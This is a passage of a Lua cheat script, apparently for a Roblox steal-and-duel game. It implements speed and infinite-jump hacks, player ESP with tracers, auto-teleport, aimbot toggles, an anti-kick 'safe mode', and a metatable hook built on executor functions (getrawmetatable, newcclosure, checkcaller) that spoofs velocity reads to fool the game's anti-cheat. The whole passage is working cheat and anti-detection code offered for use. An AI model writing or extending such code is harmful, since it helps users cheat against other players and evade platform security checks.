                for _, o in ipairs(objs) do
                    if o:IsA("BasePart") then handle = o; break end
                    local f = o:FindFirstChildWhichIsA("BasePart", true)
                    if f then handle = f; break end
                end
                if handle then
                    local h = handle:Clone()
                    h.Name = "AuFfitAccessory"
                    h.CanCollide = false
                    h.Anchored = false
                    h.Massless = true
                    h.Parent = char
                    local weld = Instance.new("Weld")
                    weld.Part0 = head
                    weld.Part1 = h
                    weld.C0 = _CFnew(cfg.offset)
                    weld.Parent = h
                end
                for _, o in ipairs(objs) do pcall(function() o:Destroy() end) end
            end
        end
        if cfg.headlessKorblox then
            applyHeadlessKorblox(char)
        else
            if char then
                local head2 = char:FindFirstChild("Head")
                if head2 then
                    head2.Transparency = 0
                    head2.CanCollide = true
                    head2.LocalTransparencyModifier = 0
                    local face2 = head2:FindFirstChild("face")
                    if face2 then face2.Transparency = 0 end
                end
                pcall(function()
                    local neck = char:FindFirstChild("Neck")
                    if neck then neck.Enabled = true end
                end)
                for _, partName in ipairs({"RightUpperLeg", "RightLowerLeg", "RightFoot"}) do
                    local limb = char:FindFirstChild(partName)
                    if limb then limb.Transparency = 0 end
                end
                local oldKorblox = char:FindFirstChild("Korblox_RightLeg")
                if oldKorblox then oldKorblox:Destroy() end
            end
        end
        if outfitSelectorLabel then outfitSelectorLabel.Text = cfg.label end
    end
    
    selectedStealMode = "V1"
    
    speedMode = false
    antiRagdollMode = "off"
    antiDieEnabled = false
    antiFlingEnabled = false
    infiniteJumpEnabled = false
    jumpEnabled = false
    laggerToggled = false
    laggerCarryToggled = false
    medusaCounterEnabled = false
    batCounterEnabled = false
    unwalkEnabled = false
    autoLeftEnabled = false
    autoRightEnabled = false
    autoBatEnabled = false
    dropMode = 1
    antiLagEnabled = false
    removeAccessoriesEnabled = false
    stretchEnabled = false
    stretchFOV = 120
    uiLocked = false
    mobileButtonsLocked = false
    uiScaleValue = 78
    stealBarScale = 100
    ragdollTimerEnabled = false
    setRagdollTimerVisual = nil
    _ragdollTimerBillboard = nil
    _ragdollTimerActive = false
    
    local function showRagdollTimer()
        if _ragdollTimerActive then return end
        _ragdollTimerActive = true
    
        local char = LP.Character
        if not char then _ragdollTimerActive = false; return end
        local head = char:FindFirstChild("Head")
        if not head then _ragdollTimerActive = false; return end
    
        if _ragdollTimerBillboard then
            pcall(function() _ragdollTimerBillboard:Destroy() end)
            _ragdollTimerBillboard = nil
        end
    
        local bill = Instance.new("BillboardGui")
        bill.Name = "YoutRagdollTimer"
        bill.Adornee = head
        bill.Size = UDim2.new(0, 150, 0, 80)
        bill.StudsOffset = Vector3.new(0, 2.5, 0)
        bill.AlwaysOnTop = true
        bill.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        bill.Parent = head
        _ragdollTimerBillboard = bill
    
        local lbl = Instance.new("TextLabel", bill)
        lbl.Size = UDim2.new(1, 0, 1, 0)
        lbl.BackgroundTransparency = 1
        lbl.Font = Enum.Font.GothamBlack
        lbl.TextSize = 72
        lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
        lbl.TextStrokeTransparency = 0
        lbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
        lbl.Text = "2"
    
        for _, n in ipairs({"2", "1"}) do
            if not ragdollTimerEnabled then break end
            lbl.Text = n
            lbl.TextSize = 40
            TS:Create(lbl, TweenInfo.new(0.15, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {TextSize = 72}):Play()
            task.wait(1)
        end
        if ragdollTimerEnabled then
            lbl.Text = "CAN STEAL"
            lbl.TextSize = 28
            TS:Create(lbl, TweenInfo.new(0.15, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {TextSize = 52}):Play()
            task.wait(0.8)
        end
    
        pcall(function() bill:Destroy() end)
        _ragdollTimerBillboard = nil
        _ragdollTimerActive = false
    end
    
    -- Monitor loop para sa ragdoll state
    task.spawn(function()
        while true do
            task.wait(0.05)
            if ragdollTimerEnabled then
                pcall(function()
                    local char = LP.Character
                    if char then
                        local hum = char:FindFirstChildOfClass("Humanoid")
                        if hum then
                            local st = hum:GetState()
                            local isRagdolled = st == Enum.HumanoidStateType.Physics
                                or st == Enum.HumanoidStateType.Ragdoll
                                or st == Enum.HumanoidStateType.FallingDown
                            if isRagdolled and not _ragdollTimerActive then
                                task.spawn(showRagdollTimer)
                            end
                        end
                    end
                end)
            end
        end
    end)
    
    -- [FROM CLEAN] Bat Bypass state (replaces old BatV2)
    autoBatV2Enabled = false
    selectedAimbotMode = "Normal"
    autoSwingEnabled = false
    _G.AceAntiBypassAimbotSpeed = _G.AceAntiBypassAimbotSpeed or 60
    _G.AceAntiBypassLaggerAimbotSpeed = _G.AceAntiBypassLaggerAimbotSpeed or 40
    _G.AceAntiBypassAimbotOn = _G.AceAntiBypassAimbotOn or false
    _G.AceNormalAimbotOn = _G.AceNormalAimbotOn or false
    _G.AceCurrentSpeedMode = _G.AceCurrentSpeedMode or "Normal"
    
    -- [FROM CLEAN] Katana + Minecraft Bat skin states
    katanaSkinEnabled = false
    minecraftBatSkinEnabled = false
    minecraftBatSkinColorMode = "Default"
    MinecraftBatSetVisual = nil
    MinecraftBatColorSelector = nil
    
    -- [FROM CLEAN] FOV state
    fovEnabled = false
    fovValue = 70
    CUSTOM_FOV_BIND = "YoutCustomFOV"
    
    -- Keep old batV2Enabled flag alias for compatibility with existing references
    batV2Enabled = false
    autoBatV2Enabled = false
    batV2Conn = nil
    batV2PrevAutoRotate = nil
    batV2SetVisual = nil
    _G.__YoutBatV2Pos = nil
    
    vividGraphicsEnabled = false
    _vividEffects = {}
    setVividVisual = nil
    
    hideButtonsEnabled = false
    setHideButtonsVisual = nil
    
    bodyLockEnabled = false
    bodyLockRange = 20
    bodyLockRangeBox = nil
    _bodyLockConn = nil
    _blSuppressCount = 0
    _blWasEnabled = false
    _blRestoreTimer = nil
    _blSmoothRestore = false
    
    savedProgressBarPos = nil
    savedButtonPositions = {}
    savedMobilePanelPos = nil
    tpBatFloatingPos = nil
    instaResetFloatingPos = nil
    instaResetFloatingButton = nil
    
    neonWeatherEnabled = false
    skyTheme = "Off"
    skySelectorLabel = nil
    _originalLighting = nil
    setNeonWeatherVisual = nil
    
    currentAnimPack = "Off"
    originalTryardAnims = nil
    tryardHeartbeatConn = nil
    animSelectorLabel = nil
    
    lastMoveDir = _V3zero
    
    local CoreGui = game:GetService("CoreGui")
    
    -- Tab system
    activeTab = "SPEED"
    tabButtons = {}
    tabPages = {}
    
    -- =====================================================================
    -- [NEW FROM CLEAN] Kick Warning / Safe Mode State
    -- =====================================================================
    antiKickEnabled = false
    setSafeModeVisual = nil
    CleanHubShowE01Warning = false
    CleanHubShowE01WarningSetVisual = nil
    CleanHubE01StartedAt = nil
    CleanHubE01Gui = nil
    
    -- =====================================================================
    -- [NEW FROM CLEAN] TP Down State
    -- =====================================================================
    mirrorTPDownEnabled = false
    mirrorTPDownSetVisual = nil
    CleanHubAutoTPDown = false
    CleanHubAutoTPDownHeight = 20
    CleanHubAutoTPDownLastAt = 0
    CleanHubAutoTPDownSetVisual = nil
    CleanHubAutoTPDownHeightBox = nil
    
    -- =====================================================================
    -- [NEW FROM CLEAN] Player ESP State
    -- =====================================================================
    espEnabled = false
    setESPVIsual = nil
    espHighlightCache = {}
    espTracerCache = {}
    espBillboardCache = {}
    espConnection = nil
    espAccumulator = 0
    profileImageCache = {}
    
    -- =====================================================================
    -- [NEW FROM CLEAN] Safe Mode Functions
    -- =====================================================================
    _G.AmbitiousSafeModeGetCountdownLabel = function()
        local ok, result = pcall(function()
            return LP.PlayerGui
                and LP.PlayerGui:FindFirstChild("DuelsMachineTopFrame")
                and LP.PlayerGui.DuelsMachineTopFrame:FindFirstChild("DuelsMachineTopFrame")
                and LP.PlayerGui.DuelsMachineTopFrame.DuelsMachineTopFrame:FindFirstChild("Timer")
                and LP.PlayerGui.DuelsMachineTopFrame.DuelsMachineTopFrame.Timer:FindFirstChild("TextLabel")
        end)
        return ok and result or nil
    end
    _G.AmbitiousSafeModeCountdownNumber = function(value)
        local text = tostring(value or ""):upper():gsub("^%s+", ""):gsub("%s+$", "")
        if text == "GO" or text == "START" or text == "READY" then
            return true
        end
        local num = tonumber(text)
        return num ~= nil and num >= 0 and num <= 10
    end
    _G.AmbitiousSafeModeCountdownValue = function()
        local textLabel = _G.AmbitiousSafeModeGetCountdownLabel()
        if not textLabel then
            return nil
        end
        local text = tostring(textLabel.Text or ""):upper():gsub("^%s+", ""):gsub("%s+$", "")
        if text == "GO" or text == "START" or text == "READY" then
            return 0
        end
        local num = tonumber(text)
        if num ~= nil and num >= 0 and num <= 10 then
            return num
        end
        return nil
    end
    _G.AmbitiousSafeModeInDuelCountdown = function()
        local textLabel = _G.AmbitiousSafeModeGetCountdownLabel()
        return textLabel and _G.AmbitiousSafeModeCountdownNumber(textLabel.Text) or false
    end
    _G.AmbitiousSafeModeBlockedTools = {
        bat = true,
        slap = true,
        sword = true,
        gun = true,
        pistol = true,
        rifle = true,
        medusa = true,
        hammer = true,
        axe = true,
        knife = true,
        katana = true,
        blade = true,
        fist = true,
    }
    _G.AmbitiousSafeModeIsCarryableTool = function(callback)
        if not callback or not callback:IsA("Tool") then
            return false
        end
        local lowercaseText = callback.Name:lower()
        for k in pairs(_G.AmbitiousSafeModeBlockedTools) do
            if lowercaseText:find(k, 1, true) then
                return false
            end
        end
        return true
    end
    _G.AmbitiousSafeModeHoldingBrainrot = function()
        local ok, result = pcall(function()
            return LP:GetAttribute("Stealing")
        end)
        if ok and result == true then
            return true
        end
        local ok2, result2 = pcall(function()
            return LP:GetAttribute("Stealing")
        end)
        if ok2 and result2 == true then
            return true
        end
        local character = LP.Character
        if not character then
            return false
        end
        local ok3, result3 = pcall(function()
            return character:GetAttribute("Stealing")
        end)
        if ok3 and result3 == true then
            return true
        end
        for _, entry in ipairs({
            "Carrying",
            "IsCarrying",
            "Grabbed",
            "Holding",
            "StealHold",
            "HasGrab",
        }) do
            local instance = character:FindFirstChild(entry, true)
            if instance then
                if instance:IsA("BoolValue") and instance.Value then
                    return true
                end
                if instance:IsA("ObjectValue") and instance.Value then
                    return true
                end
                if instance:IsA("StringValue") and instance.Value ~= "" then
                    return true
                end
            end
        end
        for _, child in ipairs(character:GetChildren()) do
            if child:IsA("Model") and child:FindFirstChildWhichIsA("BasePart", true) then
                local lowercaseText = child.Name:lower()
                if
                    lowercaseText:find("brainrot")
                    or lowercaseText:find("animal")
                    or lowercaseText:find("carry")
                    or lowercaseText:find("grab")
                    or lowercaseText:find("steal")
                    or lowercaseText:find("hold")
                then
                    return true
                end
            end
        end
        return false
    end
    _G.AmbitiousSafeModeIsLocked = function()
        if not antiKickEnabled then
            return false
        end
        return _G.AmbitiousSafeModeInDuelCountdown() or _G.AmbitiousSafeModeHoldingBrainrot()
    end
    _G.AmbitiousSafeModeForceStop = function(value)
        local object = autoBatEnabled and disableAutoBat
        local isEnabled = false
        if object then
            disableAutoBat()
            isEnabled = true
        end
        if autoBatV2Enabled and disableBatV2 then
            disableBatV2()
            isEnabled = true
        end
        if batDesyncTpEnabled and stopBatDesyncTp then
            stopBatDesyncTp()
            isEnabled = true
        end
        if autoLeftEnabled then
            autoLeftEnabled = false
            if autoLeftSetVisual then
                autoLeftSetVisual(false)
            end
            stopAutoLeft()
            isEnabled = true
        end
        if autoRightEnabled then
            autoRightEnabled = false
            if autoRightSetVisual then
                autoRightSetVisual(false)
            end
            stopAutoRight()
            isEnabled = true
        end
        if isEnabled then
            print("[SafeMode]", value or "LOCK")
        end
    end
    _G.AmbitiousSafeModeTryStart = function()
        if _G.AmbitiousSafeModeIsLocked and _G.AmbitiousSafeModeIsLocked() then
            _G.AmbitiousSafeModeForceStop("SAFE MODE LOCK")
            return false
        end
        return true
    end
    _G.AmbitiousSafeModeMonitorStarted = _G.AmbitiousSafeModeMonitorStarted or false
    if not _G.AmbitiousSafeModeMonitorStarted then
        _G.AmbitiousSafeModeMonitorStarted = true
        RunService.Heartbeat:Connect(function()
            if antiKickEnabled and _G.AmbitiousSafeModeIsLocked and _G.AmbitiousSafeModeIsLocked() then
                _G.AmbitiousSafeModeForceStop("SAFE MODE LOCK")
            end
        end)
    end
    
    -- =====================================================================
    -- [NEW FROM CLEAN] TP Down Function
    -- =====================================================================
    teleportDown = function()
        pcall(function()
            local character = LP.Character
            if not character then
                return
            end
            local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
            if not humanoidRootPart then
                return
            end
            local cFrame = humanoidRootPart.CFrame
            humanoidRootPart.CFrame = _CFnew(humanoidRootPart.Position.X, -7, humanoidRootPart.Position.Z)
                * CFrame.Angles(0, select(2, cFrame:ToEulerAnglesYXZ()), 0)
            humanoidRootPart.Velocity = _V3zero
        end)
    end
    
    -- =====================================================================
    -- [NEW FROM CLEAN] Mirror TP Down System
    -- =====================================================================
    do
        local trackedPlayerHeights = {}
        local lastMirrorTeleportTime = 0
        local function hasActiveTeleportAimbot()
            return _G.AmbitiousNormalAimbotOn == true
                or _G.AmbitiousBatAimbotV2On == true
                or _G.AmbitiousTPBatOn == true
                or _G.AlvaroTP and _G.AlvaroTP.on == true
                or autoBatEnabled == true
                or autoBatV2Enabled == true
                or batDesyncTpEnabled == true
        end
        local function mirrorTeleportDown()
            local character = LP.Character
            local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
            character = character and character:FindFirstChildOfClass("Humanoid")
            if not humanoidRootPart or not character or character.Health <= 0 then
                return
            end
            local now = _tick()
            if now - lastMirrorTeleportTime < 0.05 then
                return
            end
            lastMirrorTeleportTime = now
            local pitch, yaw = humanoidRootPart.CFrame:ToEulerAnglesYXZ()
            humanoidRootPart.CFrame = _CFnew(humanoidRootPart.Position.X, -7, humanoidRootPart.Position.Z)
                * CFrame.Angles(0, yaw, 0)
            humanoidRootPart.Velocity = _V3zero
            pcall(function()
                humanoidRootPart.AssemblyLinearVelocity = _V3zero
            end)
        end
        RunService.Heartbeat:Connect(function()
            if not mirrorTPDownEnabled or not hasActiveTeleportAimbot() then
                table.clear(trackedPlayerHeights)
                return
            end
            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= LP and player.Character then
                    local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
                    if humanoidRootPart then
                        local y = humanoidRootPart.Position.Y
                        local previousHeight = trackedPlayerHeights[player.UserId]
                        if previousHeight and previousHeight - y >= 3 then
                            pcall(mirrorTeleportDown)
                            table.clear(trackedPlayerHeights)
                            return
                        end
                        trackedPlayerHeights[player.UserId] = y
                    end
                end
            end
        end)
        _G.AmbitiousSetMirrorTPDown = function(enabled)
            mirrorTPDownEnabled = enabled == true
            if not mirrorTPDownEnabled then
                table.clear(trackedPlayerHeights)
            end
            if mirrorTPDownSetVisual then
                mirrorTPDownSetVisual(mirrorTPDownEnabled)
            end
            pcall(saveAllSettings)
        end
    end
    
    -- =====================================================================
    -- [NEW FROM CLEAN] Auto TP Down Loop
    -- =====================================================================
    RunService.Heartbeat:Connect(function()
        if not CleanHubAutoTPDown then
            return
        end
        local character = LP.Character
        local rootPart = character and character:FindFirstChild("HumanoidRootPart")
        character = character and character:FindFirstChildOfClass("Humanoid")
        local shouldTeleportDown = rootPart
            and character
            and character.FloorMaterial == Enum.Material.Air
            and rootPart.Position.Y >= CleanHubAutoTPDownHeight
        if shouldTeleportDown then
            local lastTeleportTime = CleanHubAutoTPDownLastAt
            shouldTeleportDown = tick() - lastTeleportTime >= 0.35
        end
        if shouldTeleportDown then
            CleanHubAutoTPDownLastAt = tick()
            teleportDown()
        end
    end)
    
    -- =====================================================================
    -- [NEW FROM CLEAN] E01 Warning (Show E01 Warning) - Now "Kick Warning"
    -- =====================================================================
    do
        local function isCarryingTarget()
            local character = LP.Character
            if not character then
                return false
            end
            for _, child in ipairs(character:GetChildren()) do
                local lowercaseText = child.Name:lower()
                if
                    lowercaseText:find("brain", 1, true)
                    or lowercaseText:find("animal", 1, true)
                    or lowercaseText:find("carry", 1, true)
                    or lowercaseText:find("steal", 1, true)
                then
                    return true
                end
            end
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            return humanoid and humanoid.WalkSpeed > 0 and humanoid.WalkSpeed <= 25 and humanoid.WalkSpeed ~= 16
        end
        RunService.Heartbeat:Connect(function()
            if not CleanHubShowE01Warning or not isCarryingTarget() then
                if CleanHubE01Gui then
                    CleanHubE01Gui.Enabled = false
                end
                CleanHubE01StartedAt = nil
                return
            end
            CleanHubE01StartedAt = CleanHubE01StartedAt or tick()
            local object = CleanHubE01StartedAt
            local value = math.clamp((tick() - object) / 2.6, 0, 1)
            if not CleanHubE01Gui then
                CleanHubE01Gui = Instance.new("ScreenGui")
                CleanHubE01Gui.Name = "CleanHubE01Warning"
                CleanHubE01Gui.ResetOnSpawn = false
                CleanHubE01Gui.IgnoreGuiInset = true
                CleanHubE01Gui.Parent = LP:WaitForChild("PlayerGui")
                local frame = Instance.new("Frame", CleanHubE01Gui)
                frame.Name = "Bar"
                frame.AnchorPoint = Vector2.new(0.5, 0)
                frame.Position = UDim2.new(0.5, 0, 0, 18)
                frame.Size = UDim2.new(0, 300, 0, 36)
                frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                frame.BackgroundTransparency = 0.34
                frame.BorderSizePixel = 0
                frame.ClipsDescendants = true
                Instance.new("UICorner", frame).CornerRadius = UDim.new(1, 0)
                local rootPart = Instance.new("Frame", frame)
                rootPart.Name = "Track"
                rootPart.Position = UDim2.new(0, 3, 0, 3)
                rootPart.Size = UDim2.new(1, -6, 1, -6)
                rootPart.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                rootPart.BackgroundTransparency = 0.48
                rootPart.BorderSizePixel = 0
                rootPart.ClipsDescendants = true
                Instance.new("UICorner", rootPart).CornerRadius = UDim.new(1, 0)
                local frame2558 = Instance.new("Frame", rootPart)
                frame2558.Name = "Fill"
                frame2558.Size = UDim2.new(0, 0, 1, 0)
                frame2558.BackgroundColor3 = Color3.fromRGB(85, 255, 85)
                frame2558.BackgroundTransparency = 0.48
                frame2558.BorderSizePixel = 0
                Instance.new("UICorner", frame2558).CornerRadius = UDim.new(1, 0)
                local textLabel = Instance.new("TextLabel", frame)
                textLabel.Name = "Label"
                textLabel.Size = UDim2.new(1, -16, 1, 0)
                textLabel.Position = UDim2.new(0, 8, 0, 0)
                textLabel.BackgroundTransparency = 1
                textLabel.Font = Enum.Font.GothamBlack
                textLabel.TextSize = 14
                textLabel.TextStrokeTransparency = 0.18
                textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
                textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
                textLabel.ZIndex = 2
            end
            CleanHubE01Gui.Enabled = true
            local warningReady = value >= 1
            CleanHubE01Gui.Bar.Label.Text = warningReady and "ENTER" or "KICK WARING"
            CleanHubE01Gui.Bar.Label.TextColor3 = Color3.fromRGB(255, 255, 255)
            CleanHubE01Gui.Bar.Track.Fill.Size = UDim2.new(value, 0, 1, 0)
        end)
    end
    
    -- =====================================================================
    -- [NEW FROM CLEAN] Player ESP System
    -- =====================================================================
    do
        local function makeESPTracers()
            if not (Drawing and type(Drawing.new) == "function") then
                return nil
            end
            local color = getThemeColor()
            local line = Drawing.new("Line")
            line.Color = color
            line.Thickness = 2.2
            line.Transparency = 0.9
            line.Visible = false
            local mid = Drawing.new("Line")
            mid.Color = color
            mid.Thickness = 1.2
            mid.Transparency = 0.74
            mid.Visible = false
            local line2 = Drawing.new("Line")
            line2.Color = color
            line2.Thickness = 0.6
            line2.Transparency = 0.1
            line2.Visible = false
            return {
                line,
                mid,
                line2,
            }
        end
        clearESP = function()
            for k in pairs(espHighlightCache) do
                pcall(function()
                    espHighlightCache[k]:Destroy()
                end)
            end
            for k in pairs(espBillboardCache) do
                pcall(function()
                    espBillboardCache[k]:Destroy()
                end)
            end
            for k in pairs(espTracerCache) do
                for _, ln in ipairs(espTracerCache[k]) do
                    pcall(function()
                        ln.Visible = false
                        ln:Remove()
                    end)
                end
            end
            espHighlightCache = {}
            espBillboardCache = {}
            espTracerCache = {}
        end
        updateESP = function()
            local now = _tick()
            if now - espAccumulator < 0.05 then
                return
            end
            espAccumulator = now
            if not espEnabled then
                clearESP()
                return
            end
            local character = LP.Character
            character = character and character:FindFirstChild("HumanoidRootPart")
            if not character then
                return
            end
            local myScreenPosition, myOnScreen = workspace.CurrentCamera:WorldToViewportPoint(character.Position)
            local vector22 = Vector2.new(myScreenPosition.X, myScreenPosition.Y)
            local currentPlayers = _GetPlayersCached()
            local plrSet = {}
            for _, p in ipairs(currentPlayers) do
                plrSet[p] = true
            end
            for k in pairs(espHighlightCache) do
                if not plrSet[k] then
                    pcall(function()
                        espHighlightCache[k]:Destroy()
                    end)
                    espHighlightCache[k] = nil
                end
            end
            for k in pairs(espBillboardCache) do
                if not plrSet[k] then
                    pcall(function()
                        espBillboardCache[k]:Destroy()
                    end)
                    espBillboardCache[k] = nil
                end
            end
            for k in pairs(espTracerCache) do
                if not plrSet[k] then
                    for _, ln in ipairs(espTracerCache[k]) do
                        pcall(function()
                            ln.Visible = false
                            ln:Remove()
                        end)
                    end
                    espTracerCache[k] = nil
                end
            end
            local color = getThemeColor()
            for _, player in ipairs(currentPlayers) do
                if player ~= LP then
                    local character2 = player.Character
                    if not character2 then
                        if espHighlightCache[player] then
                            pcall(function()
                                espHighlightCache[player]:Destroy()
                            end)
                            espHighlightCache[player] = nil
                        end
                        if espBillboardCache[player] then
                            pcall(function()
                                espBillboardCache[player]:Destroy()
                            end)
                            espBillboardCache[player] = nil
                        end
                        if espTracerCache[player] then
                            for _, ln in ipairs(espTracerCache[player]) do
                                pcall(function()
                                    ln.Visible = false
                                end)
                            end
                        end
                    else
                        local humanoidRootPart = character2:FindFirstChild("HumanoidRootPart")
                        local head = character2:FindFirstChild("Head")
                        local humanoid = character2:FindFirstChildOfClass("Humanoid")
                        if humanoidRootPart and head and humanoid and humanoid.Health > 0 then
                            local highlight = espHighlightCache[player]
                            if not highlight or not highlight.Parent or highlight.Parent ~= character2 then
                                if highlight then
                                    pcall(function()
                                        highlight:Destroy()
                                    end)
                                end
                                highlight = Instance.new("Highlight")
                                highlight.Name = "YoutESP"
                                highlight.FillColor = color
                                highlight.FillTransparency = 0.72
                                highlight.OutlineColor = color
                                highlight.OutlineTransparency = 0.05
                                highlight.Adornee = character2
                                highlight.Parent = character2
                                espHighlightCache[player] = highlight
                            end
                            local billboardGui = espBillboardCache[player]
                            if not billboardGui or not billboardGui.Parent then
                                if billboardGui then
                                    pcall(function()
                                        billboardGui:Destroy()
                                    end)
                                end
                                billboardGui = Instance.new("BillboardGui")
                                billboardGui.Name = "YoutESP_ProfilePic"
                                billboardGui.Size = UDim2.new(0, 56, 0, 56)
                                billboardGui.StudsOffset = _V3new(0, 3.8, 0)
                                billboardGui.Adornee = head
                                billboardGui.AlwaysOnTop = true
                                billboardGui.Parent = head
                                local img = Instance.new("ImageLabel", billboardGui)
                                img.Size = UDim2.new(1, -6, 1, -6)
                                img.Position = UDim2.new(0, 3, 0, 3)
                                img.BackgroundTransparency = 1
                                img.Image = "rbxassetid://0"
                                img.ScaleType = Enum.ScaleType.Fit
                                Instance.new("UICorner", img).CornerRadius = UDim.new(1, 0)
                                local uiStroke = Instance.new("UIStroke", img)
                                uiStroke.Color = color
                                uiStroke.Thickness = 1.5
                                espBillboardCache[player] = billboardGui
                                task.spawn(function()
                                    local userId = player.UserId
                                    local image = profileImageCache[userId]
                                    if not image then
                                        local ok
                                        ok, image = pcall(function()
                                            return Players:GetUserThumbnailAsync(
                                                userId,
                                                Enum.ThumbnailType.HeadShot,
                                                Enum.ThumbnailSize.Size420x420
                                            )
                                        end)
                                        if ok and image and image ~= "" then
                                            profileImageCache[userId] = image
                                        else
                                            image = "rbxassetid://0"
                                        end
                                    end
                                    if img then
                                        img.Image = image
                                    end
                                end)
                            else
                                if billboardGui.Adornee ~= head then
                                    billboardGui.Adornee = head
                                end
                                billboardGui.Enabled = true
                            end
                            local lines = espTracerCache[player]
                            if not lines then
                                lines = makeESPTracers()
                                espTracerCache[player] = lines or {}
                            end
                            if lines and #lines > 0 then
                                local position, onScreen =
                                    workspace.CurrentCamera:WorldToViewportPoint(humanoidRootPart.Position)
                                if onScreen and position.Z > 0 and myOnScreen then
                                    local vector23 = Vector2.new(position.X, position.Y)
                                    for _, ln in ipairs(lines) do
                                        ln.From = vector22
                                        ln.To = vector23
                                        ln.Visible = true
                                    end
                                else
                                    for _, ln in ipairs(lines) do
                                        ln.Visible = false
                                    end
                                end
                            end
                        else
                            if espHighlightCache[player] then
                                pcall(function()
                                    espHighlightCache[player]:Destroy()
                                end)
                                espHighlightCache[player] = nil
                            end
                            if espBillboardCache[player] then
                                pcall(function()
                                    espBillboardCache[player]:Destroy()
                                end)
                                espBillboardCache[player] = nil
                            end
                            if espTracerCache[player] then
                                for _, ln in ipairs(espTracerCache[player]) do
                                    pcall(function()
                                        ln.Visible = false
                                    end)
                                end
                            end
                        end
                    end
                end
            end
        end
        local function startESPLoop()
            if espConnection then
                espConnection:Disconnect()
            end
            espConnection = RunService.RenderStepped:Connect(updateESP)
        end
        local function stopESPLoop()
            if espConnection then
                espConnection:Disconnect()
                espConnection = nil
            end
            clearESP()
        end
        toggleESP = function(on)
            espEnabled = on
            if on then
                startESPLoop()
            else
                stopESPLoop()
            end
            if setESPVIsual then
                setESPVIsual(on)
            end
            saveAllSettings()
        end
    end
    
    -- =====================================================================
    -- (Original Ori continues below)
    -- =====================================================================
    
    local InfiniteJump = { enabled = false, jumpPower = 55, minVelocity = 35, fallClamp = -120, jumpConn = nil, heartbeatConn = nil }
    
    local function applyJump(root)
        if not root then return end
        pcall(function()
            root.Velocity = _V3new(root.Velocity.X, InfiniteJump.jumpPower, root.Velocity.Z)
        end)
    end
    
    local function onJumpRequest()
        if not InfiniteJump.enabled then return end
        local char = LP.Character
        if not char then return end
        local root = char:FindFirstChild("HumanoidRootPart")
        if root then applyJump(root) end
    end
    
    local function onHeartbeat()
        if not InfiniteJump.enabled then return end
        local char = LP.Character
        if not char then return end
        local root = char:FindFirstChild("HumanoidRootPart")
        if not root then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum then return end
        local jumpHeld = UIS:IsKeyDown(Enum.KeyCode.Space) or (hum.Jump == true)
        if jumpHeld and root.Velocity.Y < InfiniteJump.minVelocity then
            applyJump(root)
        end
        if root.Velocity.Y < InfiniteJump.fallClamp then
            root.Velocity = _V3new(root.Velocity.X, InfiniteJump.fallClamp, root.Velocity.Z)
        end
    end
    
    local function connectEvents()
        if InfiniteJump.jumpConn then InfiniteJump.jumpConn:Disconnect() end
        if InfiniteJump.heartbeatConn then InfiniteJump.heartbeatConn:Disconnect() end
        InfiniteJump.jumpConn = UIS.JumpRequest:Connect(onJumpRequest)
        InfiniteJump.heartbeatConn = RunService.Heartbeat:Connect(onHeartbeat)
    end
    
    function InfiniteJump.start()
        if InfiniteJump.enabled then return end
        InfiniteJump.enabled = true
        connectEvents()
    end
    
    function InfiniteJump.stop()
        InfiniteJump.enabled = false
        if InfiniteJump.jumpConn then InfiniteJump.jumpConn:Disconnect(); InfiniteJump.jumpConn = nil end
        if InfiniteJump.heartbeatConn then InfiniteJump.heartbeatConn:Disconnect(); InfiniteJump.heartbeatConn = nil end
    end
    
    function InfiniteJump.setJumpPower(power)
        power = tonumber(power) or 55
        InfiniteJump.jumpPower = _clamp(power, 10, 200)
    end
    
    function InfiniteJump.isRunning() return InfiniteJump.enabled == true end
    
    function getActiveMoveSpeed()
        if laggerCarryToggled then return LAGGER_CARRY_SPEED
        elseif laggerToggled then return LAGGER_SPEED
        elseif speedMode then return CS
        else return NS end
    end
    
    function getSpeedModeName()
        if laggerToggled or laggerCarryToggled then return "LAGGER"
        elseif speedMode then return "CARRY"
        else return "NORMAL" end
    end
    
    -- =====================================================================
    -- [FIX SPEED VIOLETTE] VELOCITY HOOK
    -- =====================================================================
    local _s2VelState = _G.__YoutSpeedHookState
    if type(_s2VelState) ~= "table" then
        _s2VelState = {
            hooked = false,
            velChecked = setmetatable({}, { __mode = "k" }),
            root = nil,
            v = _V3zero,
        }
        _G.__YoutSpeedHookState = _s2VelState
    end
    local _velChecked = _s2VelState.velChecked
    local _hookedVelParts = {}
    
    local _hookVelSupported = nil
    local function _hookVelHRP(hrp)
        if not hrp then return end
        _s2VelState.root = hrp
        _velChecked[hrp] = true
        if _s2VelState.hooked then return end
        if type(getrawmetatable) ~= "function" or type(setreadonly) ~= "function"
           or type(newcclosure) ~= "function" or type(checkcaller) ~= "function" then
            return
        end
        local ok = pcall(function()
            local mt = getrawmetatable(game)
            if not mt then return end
    
            setreadonly(mt, false)
    
            local originalIndex = rawget(mt, "__index")
            local originalNewIndex = rawget(mt, "__newindex")
    
            local function isOurRoot(t, k)
                local tk = tostring(k)
                if tk ~= "AssemblyLinearVelocity" and tk ~= "Velocity" then return false end
                if typeof(t) ~= "Instance" or not t:IsA("BasePart") then return false end
                local tn = t.Name
                if tn ~= "HumanoidRootPart" and tn ~= "Torso" and tn ~= "UpperTorso" then return false end
                local char = LP.Character
                return char ~= nil and t:IsDescendantOf(char)
            end
    
            if type(originalIndex) == "function" or type(originalIndex) == "table" then
                local replacementIndex = newcclosure(function(self, key)
                    if not checkcaller() then
                        local good, mine = pcall(isOurRoot, self, key)
                        if good and mine then return _s2VelState.v end
                    end
                    if type(originalIndex) == "function" then
                        return originalIndex(self, key)
                    else
                        return originalIndex[key]
                    end
                end)
                mt.__index = replacementIndex
            end
    
            if type(originalNewIndex) == "function" then
                local replacementNewIndex = newcclosure(function(self, key, value)
                    if not checkcaller() then
                        local good, mine = pcall(isOurRoot, self, key)
                        if good and mine then
